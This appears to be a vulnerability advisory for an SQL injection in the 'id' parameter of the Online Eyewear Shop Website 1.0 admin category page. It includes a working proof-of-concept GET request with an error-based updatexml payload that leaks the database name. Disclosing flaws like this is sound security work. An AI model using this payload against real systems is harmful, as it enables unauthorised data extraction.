## Online Eyewear Shop Website has a front-end SQL injection vulnerability

## Affected version: 
Online Eyewear Shop Website - 1.0

## Software:
https://www.sourcecodester.com/php/16089/online-eyewear-shop-website-using-php-and-mysql-free-download.html

## Vulnerability File:
http://localhost/oews/admin/?page=categories/view_category&id=3

## Description:
Online Eyewear Shop Website1.0 has a SQL injection attack in view_category.php, and the attack parameter is id. Attackers can exploit this vulnerability to directly obtain sensitive information from the server.

Status: CRITICAL

POC
```
GET /oews/admin/?page=categories/view_category&id=3%27%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=af5dsp386jat1uspen8v4e8hhq
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

Get the database name directly through the error report: oews_db

![CleanShot 2024-09-20 at 16 38 19@2x](https://github.com/user-attachments/assets/f86a68cb-5553-486f-9430-e4a450115176)



